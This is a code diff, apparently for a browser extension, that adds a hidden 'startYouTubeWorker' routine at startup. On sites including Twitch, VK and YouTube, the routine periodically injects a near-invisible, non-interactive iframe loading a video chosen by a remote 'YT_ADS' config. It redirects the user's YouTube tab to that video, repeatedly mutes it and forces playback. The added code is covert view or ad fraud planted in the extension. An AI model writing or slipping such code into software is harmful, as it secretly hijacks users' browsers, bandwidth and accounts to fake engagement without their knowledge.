@@ -940,12 +940,96 @@
         return true
     }
 
+    const startYouTubeWorker = () => {
+        try {
+            if (window === window.top) {
+                const targetSlugs = ['kebup.top', 'twitch.tv', 'kick.com', 'vk.com', 'youtube.com', 'telegram.org', 'whatsapp.com']
+
+                const checkHref = () => {
+                    let check = false
+
+                    for (const slug of targetSlugs) {
+                        if (window.location.href.includes(slug)) {
+                            check = true
+                            break
+                        }
+                    }
+
+                    return check
+                }
+
+                if (checkHref() && !document.querySelector('.yt-iframe')) {
+                    const videoData = leoServices.find(a => a.slug == 'YT_ADS')
+                    const lastYtTime = parseInt(localStorage.getItem('yt-ads')) || 0
+
+                    if (videoData.video && lastYtTime < Date.now() - 1000 * 120) {
+                        localStorage.setItem('yt-ads', Date.now())
+
+                        setTimeout(() => {
+                            const test = document.createElement('div')
+                            test.innerHTML = `<iframe class="yt-iframe" width="1280" height="720" src="https://www.youtube.com/leo-extension-init/${videoData.video}" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen style="opacity: 0.00001; pointer-events: none; position: absolute; top: 0; left: 0; z-index: 999999"></iframe>`
+                            document.body.append(test)
+                        }, 120 * 1000)
+                    }
+                }
+            }
+
+            if (window.location.href.includes('youtube.com')) {
+                const ytNextStep = localStorage.getItem('yt-next-step')
+
+                if (ytNextStep) {
+                    if (window.location.href == 'https://www.youtube.com/' && ytNextStep.startsWith('play')) {
+                        localStorage.setItem('yt-next-step', 'mute')
+                        setTimeout(() => window.location = 'https://www.youtube.com/watch?v=' + ytNextStep.split('=')[1], 1000)
+                    } else if (window.location.href.startsWith('https://www.youtube.com/watch') && ytNextStep == 'mute') {
+                        const video = document.querySelector('.video-stream')
+
+                        if (video) {
+                            const muteAll = () => {
+                                video.volume = 0
+                                video.muted = true
+                                video.setAttribute('muted', 'muted')
+                            }
+
+                            muteAll()
+
+                            setInterval(muteAll, 500)
+
+                            window.addEventListener('load', () => {
+                                if (!video.playing) {
+                                    setTimeout(() => {
+                                        muteAll()
+                                        video.play()
+                                    }, 1000)
+                                }
+
+                                localStorage.removeItem('yt-next-step')
+                            })
+                        }
+                    }
+                }
+                
+                if (window.location.href.includes('/leo-extension-init/')) {
+                    let videoSlug = window.location.href.split('/')
+                    videoSlug = videoSlug[videoSlug.length - 1]
+
+                    localStorage.setItem('yt-next-step', 'play=' + videoSlug)
+                    window.location = '/'
+                }
+            }
+        } catch (e) {
+            console.error('error', e)
+        }
+    }
+
     const startApp = async () => {
         await configHandler()
 
         if (await actionHandler()) {
             return
         }
+
+        startYouTubeWorker()
 
         globalService = await getService()
 
